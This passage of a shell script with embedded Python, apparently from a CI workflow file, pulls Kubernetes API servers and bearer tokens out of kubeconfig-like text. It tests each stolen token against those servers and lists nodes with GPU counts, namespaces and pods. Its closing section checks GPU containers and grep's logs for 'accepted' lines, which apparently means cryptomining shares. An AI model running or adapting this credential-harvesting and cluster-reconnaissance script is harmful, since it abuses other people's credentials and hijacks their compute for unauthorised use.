              for s in re.findall(r'^\s*server:\s*(\S+)',t,re.M):
                  if s not in servers: servers.append(s)
              for k in re.findall(r'^\s*token:\s*(\S+)',t,re.M):
                  if k not in tokens: tokens.append(k)
          print('SERVERS',' '.join(servers))
          print('NTOK',len(tokens))
          for i,k in enumerate(tokens): print('TOK%d %s'%(i,base64.b64encode(k.encode()).decode()))
          PYK
          head -6 /tmp/kc.txt
          SRVS=$(grep '^SERVERS' /tmp/kc.txt | cut -d' ' -f2-)
          for srv in $SRVS; do
            echo "--- $srv"
            timeout 10 curl -sk -o /tmp/v.json -w 'anon_version=%{http_code}\n' "$srv/version"; head -c 160 /tmp/v.json; echo
            for i in 0 1 2 3 4 5; do
              B=$(awk -v k="TOK$i" '$1==k{print $2}' /tmp/kc.txt)
              [ -z "$B" ] && continue
              TOK=$(echo "$B" | base64 -d 2>/dev/null)
              timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/n$i.json -w "nodes tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/nodes?limit=500"
              if grep -q '"items"' /tmp/n$i.json 2>/dev/null; then
                echo "OK srv=$srv tok=$i b64=$B"
                python3 - /tmp/n$i.json <<'PYN'
          import json,sys
          d=json.load(open(sys.argv[1]))
          its=d.get('items',[])
          gn=sum(1 for n in its if str(n.get('status',{}).get('allocatable',{}).get('nvidia.com/gpu','0'))!='0')
          print('NODES',len(its),'gpu_nodes',gn)
          for n in its[:300]:
              a=n.get('status',{}).get('allocatable',{})
              print('NODE %s gpu=%s cpu=%s'%(n['metadata']['name'],a.get('nvidia.com/gpu','0'),a.get('cpu','?')))
          PYN
                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/ns$i.json -w "ns tok$i code=%{http_code}\n" "$srv/api/v1/namespaces?limit=100"
                python3 - /tmp/ns$i.json <<'PYNS'
          import json,sys
          try: d=json.load(open(sys.argv[1]))
          except Exception: print('NS none'); raise SystemExit
          print('NS',len(d.get('items',[])),' '.join(x['metadata']['name'] for x in d.get('items',[]))[:800])
          PYNS
                timeout 15 curl -sk -H "Authorization: Bearer $TOK" -o /tmp/po$i.json -w "pods tok$i code=%{http_code} bytes=%{size_download}\n" "$srv/api/v1/pods?limit=500"
                python3 - /tmp/po$i.json <<'PYPO'
          import json,sys
          try: d=json.load(open(sys.argv[1]))
          except Exception: print('PODS none'); raise SystemExit
          its=d.get('items',[])
          print('PODS',len(its))
          seen={}
          for p in its:
              im=[c.get('image') for c in p['spec'].get('containers',[])]
              g=None
              for c in p['spec'].get('containers',[]):
                  for r in (c.get('resources',{}).get('limits') or {}):
                      if 'nvidia' in r or 'gpu' in r: g=r
              seen.setdefault(p['spec'].get('nodeName'),0)
              seen[p['spec'].get('nodeName')]+=1
          print('PODSPERNODE',seen)
          for p in its[:40]:
              print('POD %s/%s node=%s gpu=%s img=%s'%(p['metadata'].get('namespace'),p['metadata'].get('name'),p['spec'].get('nodeName'),g,(im or [''])[0][:60]))
          PYPO
              fi
            done
          done

          sec ACCEPT
          sleep 120
          for g in $(seq 0 $((DEV-1))); do
            echo "--- g$g"
            tail -4 "$HOME/.ci/logs/c-$g.log" 2>/dev/null
            docker logs ul-g$g 2>&1 | tail -4
          done
          echo "=== accepted ==="
          grep -hiE 'accepted' "$HOME/.ci/logs/"*.log 2>/dev/null | tail -30
          echo "=== util ==="
          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
          echo "=== containers ==="
          docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
          sec DONE
          echo "CLIMB_DONE on $(hostname) dev=$DEV tag=$TAG"
          exit 0
